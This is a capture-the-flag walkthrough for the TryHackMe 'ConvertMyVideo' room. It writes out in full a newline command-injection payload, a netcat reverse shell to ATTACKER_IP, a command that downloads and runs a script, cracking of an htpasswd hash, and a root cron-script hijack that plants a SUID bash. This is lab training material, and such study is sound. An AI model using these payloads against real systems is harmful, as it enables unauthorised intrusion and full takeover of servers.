# ConvertMyVideo

My Script to convert videos to MP3 is super secure

Room: https://tryhackme.com/room/convertmyvideo

⚠️ STOP

Stuck and need a nudge in the right direction?

➡️ Try the hints page before reading the full solution: https://github.com/garthheff/CTF-Hints/blob/main/convertmyvideo.md

----------------------------------

## Summary

ConvertMyVideo hosts a web application that converts YouTube videos to MP3. Enumeration revealed an admin area protected by HTTP Basic Authentication and a public converter endpoint using `youtube-dl`.

The initial foothold was achieved through command injection in the `yt_url` POST parameter. The application passed user input into a shell command, and newline injection allowed command execution as `www-data`.

Privilege escalation was achieved by finding a root cron job running a writable cleanup script from the web directory. Replacing that script with a SUID Bash payload gave a root shell.

---

## Enumeration

Directory brute forcing found several useful paths:

```bash
gobuster dir -u http://TARGET \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,txt,html,js,bak,zip
```

Interesting results:

```text
/index.php            200
/images               301
/admin                401
/js                   301
/tmp                  301
/server-status        403
```

The `/admin` path returned HTTP Basic Authentication.

```bash
curl -i http://TARGET/admin
```

Response:

```text
HTTP/1.1 401 Unauthorized
WWW-Authenticate: Basic realm="AdminArea"
Server: Apache/2.4.29 (Ubuntu)
```

The realm name confirmed the hidden admin area:

```text
AdminArea
```

---

## Discovering the Converter Parameter

The homepage submitted an AJAX-style POST request to `/`.

The correct parameter name was:

```text
yt_url
```

A normal request looked like this:

```bash
curl -s --compressed -X POST http://TARGET/ \
  -H 'X-Requested-With: XMLHttpRequest' \
  -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
  --data-urlencode 'yt_url=https://www.youtube.com/watch?v=321'
```

The application returned a JSON response containing `youtube-dl` errors:

```json
{
  "status": 1,
  "errors": "ERROR: Incomplete YouTube ID 321...",
  "url_orginal": "https://www.youtube.com/watch?v=321",
  "output": "",
  "result_url": "/tmp/downloads/<random>.mp3"
}
```

This strongly suggested that the backend was passing the supplied URL to `youtube-dl`.

---

## Command Injection

Initial payloads using semicolons were noisy, but newline injection confirmed command execution.

Working test payload:

```bash
curl -s --compressed -X POST http://TARGET/ \
  -H 'X-Requested-With: XMLHttpRequest' \
  -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
  --data-urlencode $'yt_url=https://www.youtube.com/watch?v=321\nid; :'
```

The response included command output:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

This confirmed command execution as `www-data`.

Some payloads failed when spaces were used, so `${IFS}` was used as a space replacement.

Example:

```bash
curl -s --compressed -X POST http://TARGET/ \
  -H 'X-Requested-With: XMLHttpRequest' \
  -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
  --data-urlencode $'yt_url=https://www.youtube.com/watch?v=321\nwhich${IFS}bash;which${IFS}sh;which${IFS}nc;which${IFS}python3;which${IFS}curl;which${IFS}wget;:'
```

This confirmed useful binaries were available:

```text
/bin/bash
/bin/sh
/bin/nc
/usr/bin/python3
/usr/bin/python
/usr/bin/perl
/usr/bin/php
/usr/bin/curl
/usr/bin/wget
```

---

## Reverse Shell

A simple reverse shell script was hosted locally.

On the AttackBox:

```bash
cat > shell.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f
mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER_IP 4444 > /tmp/f
EOF

python3 -m http.server 8000
```

In another terminal:

```bash
nc -lvnp 4444
```

The target was then made to download and execute the script:

```bash
curl -s --compressed -X POST http://TARGET/ \
  -H 'X-Requested-With: XMLHttpRequest' \
  -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
  --data-urlencode $'yt_url=https://www.youtube.com/watch?v=321\ncurl${IFS}http://ATTACKER_IP:8000/shell.sh${IFS}-o${IFS}/tmp/shell.sh;sh${IFS}/tmp/shell.sh;:'
```

A shell landed as `www-data`:

```text
Connection received
/bin/sh: 0: can't access tty; job control turned off
$
```

Shell upgrade:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

---

## Admin Area

Inside the web root, the admin directory contained:

```bash
cd /var/www/html/admin
ls -la
```

Files included:

```text
.htaccess
.htpasswd
flag.txt
index.php
```

Reading the admin flag:

```bash
cat flag.txt
```

Flag:

```text
flag{0d84...6ed7}
```

---

## Basic Auth Credentials

The `.htaccess` file showed the Basic Auth configuration:

```apache
AuthName "AdminArea"
AuthType Basic
AuthUserFile /var/www/html/admin/.htpasswd
Require valid-user
```

The `.htpasswd` file contained an Apache MD5 hash:

```text
itsmeadmin:$apr1$tbcm2uwv$UP1ylvgp4.zLKxWj8mc6y/
```

Save and crack it with John:

```bash
echo 'itsmeadmin:$apr1$tbcm2uwv$UP1ylvgp4.zLKxWj8mc6y/' > htpasswd.txt
john --wordlist=/usr/share/wordlists/rockyou.txt htpasswd.txt
john --show htpasswd.txt
```

Cracked credentials:

```text
itsmeadmin:j*****
```

The admin panel could then be accessed with:

```bash
curl -i -u 'itsmeadmin:j*****' http://TARGET/admin/
```

---

## Authenticated Command Execution

The admin `index.php` contained a direct command execution vulnerability:

```php
<?php
  if (isset($_REQUEST['c'])) {
      system($_REQUEST['c']);
      echo "Done :)";
  }
?>

<a href="/admin/?c=rm -rf /var/www/html/tmp/downloads">
   <button>Clean Downloads</button>
</a>
```

The vulnerable line was:

```php
system($_REQUEST['c']);
```

This meant the admin panel also allowed command execution through the `c` parameter:

```bash
curl -s -u 'itsmeadmin:j*****' \
  'http://TARGET/admin/?c=id'
```

In this run, the unauthenticated `yt_url` injection was used first, so the admin command runner was discovered afterwards.

There were therefore two command execution paths:

```text
1. Unauthenticated command injection through the public yt_url converter parameter
2. Authenticated command execution through /admin/?c= after cracking Basic Auth
```

---

## Privilege Escalation Enumeration

SUID enumeration did not immediately reveal an obvious custom binary:

```bash
find / -perm -4000 -type f -printf '%u %g %m %p\n' 2>/dev/null
```

A real local user existed:

```bash
ls -la /home
```

Output:

```text
dmv
```

Password reuse with the cracked admin password did not work for `dmv`.

Next, `pspy64` was run for two minutes:

```bash
timeout 120 ./pspy64
```

Interesting output:

```text
UID=0 | /bin/sh -c cd /var/www/html/tmp && bash /var/www/html/tmp/clean.sh
UID=0 | bash /var/www/html/tmp/clean.sh
UID=0 | rm -rf downloads
```

This showed root was running:

```bash
/var/www/html/tmp/clean.sh
```

every minute.

---

## Writable Root Cron Script

The cleanup script was writable by `www-data`, so it could be replaced with a SUID Bash payload.

Payload:

```bash
cat > /var/www/html/tmp/clean.sh <<'EOF'
#!/bin/bash
cp /bin/bash /var/www/html/tmp/rootbash
chmod 4755 /var/www/html/tmp/rootbash
EOF
```

After the next cron run:

```bash
ls -la /var/www/html/tmp/rootbash
```

The binary had the SUID bit set:

```text
-rwsr-xr-x 1 root root ... /var/www/html/tmp/rootbash
```

Run it with `-p` to preserve privileges:

```bash
/var/www/html/tmp/rootbash -p
```

Confirmed root:

```bash
whoami
```

Output:

```text
root
```

---

## Root Flag

```bash
cd /root
cat root.txt
```

Root flag:

```text
flag{d9b3...e94a}
```

---

## Final Attack Chain

```text
Gobuster discovered /admin and /tmp
→ /admin used HTTP Basic Auth
→ POST parameter yt_url passed input to youtube-dl
→ newline injection gave command execution as www-data
→ ${IFS} bypassed space parsing issues
→ downloaded and executed shell.sh
→ reverse shell as www-data
→ found admin flag and .htpasswd
→ cracked itsmeadmin:j*****
→ confirmed /admin/?c= was authenticated command execution
→ pspy64 revealed root cron running /var/www/html/tmp/clean.sh
→ replaced clean.sh with SUID Bash payload
→ rootbash -p
→ root
```

---

## Notes

This box had two useful RCE paths:

1. The public converter endpoint was vulnerable to command injection through the `yt_url` parameter.
2. The admin panel had an authenticated command runner through the `c` parameter.

The root escalation path was the writable cleanup script executed by root every minute.

The route used here found the unauthenticated converter injection first, then later confirmed the admin panel command execution.
